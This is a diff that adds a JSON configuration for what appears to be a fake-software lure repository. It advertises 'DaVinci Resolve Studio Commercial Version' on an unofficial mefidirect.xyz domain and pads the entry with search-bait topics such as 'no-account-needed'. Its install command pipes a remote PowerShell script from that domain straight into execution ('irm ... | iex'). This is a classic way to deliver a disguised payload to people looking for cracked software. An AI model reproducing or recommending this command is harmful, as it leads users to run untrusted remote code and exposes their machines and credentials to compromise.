@@ -1,0 +1,28 @@
+{
+  "repo": "davinci-resolve-studio-commercial-version",
+  "product": "DaVinci Resolve Studio Commercial Version",
+  "kind": "video",
+  "install_type": "download",
+  "download_url": "https://davinci-resolve.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "davinci-resolve-offline-installer",
+    "davinci-resolve-native-client",
+    "davinci-resolve-toolkit",
+    "davinci-resolve-faq",
+    "local-first",
+    "proxy-editing",
+    "no-account-needed",
+    "pro-workflow",
+    "color-grading",
+    "davinci-resolve-installer",
+    "timeline-editing",
+    "daily-driver",
+    "davinci-resolve-latest-build",
+    "davinci-resolve-user-guide"
+  ]
+}
